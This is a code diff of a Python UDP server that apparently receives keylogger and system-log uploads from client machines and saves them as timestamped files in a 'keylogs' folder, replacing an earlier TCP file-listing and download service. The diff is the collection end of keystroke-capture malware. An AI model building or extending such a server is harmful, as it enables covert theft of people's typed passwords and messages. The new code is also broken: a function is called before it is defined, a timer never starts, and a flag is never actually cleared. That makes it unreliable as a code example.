@@ -3,6 +3,9 @@ import socket
 import os
 import fileinput
 import sys
+from datetime import datetime
+import threading
+
 
 #setting up the server
 udp_port = 25005
@@ -10,72 +13,40 @@ buffer_size = 1024
 serversocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 host = '127.0.0.1' #this used for local tests
 
-#listening for a connection and accepting it
+#setting up host to listen for connections
 serversocket.bind((host, udp_port))
 print("Server started on " + host + " on port " + str(udp_port) + "\n")
 
+openFile = False
+
+#accepting a connection
 while(True):
     data, addr = serversocket.recvfrom(buffer_size)
+    now = datetime.now()
+    current_time = now.strftime("%H_%M_%S")
+    if data.decode() == "incoming_keylog":
+        filename = ("./keylogs/" + current_time + "_keylog.txt")
+    elif data.decode() == "incoming_syslog":
+        filename = ("./keylogs/" + current_time + "_syslog.txt")
+    else:
+        print("Received bad data.\n")
+        break
+    f = open (filename, 'wb')
+    print("Connection established. Awaiting transmission.\n")
+    openFile = True
+    timeout_timer = threading.Timer(25.0, close_file)
+    while(openFile):
+        l, addr = serversocket.recvfrom(buffer_size)
+        f.write(l)
+    f.close()
 
 
-def pull_file(decode_command):
-    filename = decode_command[4:]
-    #print("Looking for file...")
-    if filename[0:1] == ".":
-        sent_data = "failure"
-        connection.send(sent_data.encode())
-        return
-    filename = ("./keylogs/" + filename)
-    #print(filename)
-    try:
-        f = open (filename, 'rb')
-        #print("Opened: " + filename + "\n")
-        sent_data = "success"
-        connection.send(sent_data.encode())
-        l = f.read(buffer_size-3)
-        while (l):
-            l = ("con".encode() + l)
-            connection.send(l)
-            reply = connection.recv(buffer_size)
-            if (reply.decode() == "received"):
-                l = f.read(buffer_size-3)
-            else: 
-                break
-        f.close()
-        print("Completed file transfer.")
-    except:
-        sent_data = "failure"
-        connection.send(sent_data.encode())
-    finally:
-        sent_data = ("eof").encode()
-        connection.send(sent_data)
-        
-
-        
-
-while(True):
-    connection, address = serversocket.accept()
-    print ('Connected to ', address)
-    #displaying the directory
-    print ('Sending directory information...')
-    directory_data = os.listdir(path = './keylogs/')
-    sent_data = "====Keylog Files====\n" + "\n".join(directory_data)
-    connection.send(sent_data.encode())
-    #now listen for a command from client
-    while(True):
-        command = connection.recv(buffer_size)
-        decode_command = command.decode()
-        #print(decode_command)
-        keyword = command[0:4]
-        #print(keyword)
-        if keyword.decode() == "pull":
-            pull_file(decode_command)
-        elif keyword.decode() == "quit":
-            break
-        else:
-            sent_data = "Command not understood.\n"
-            connection.send(sent_data.encode())
-
-    connection.close()
+def close_file():
+    openFile = False
+    print("No connection received for 25s, connection timing out.")
+    
+    
 
 serversocket.close()
+
+
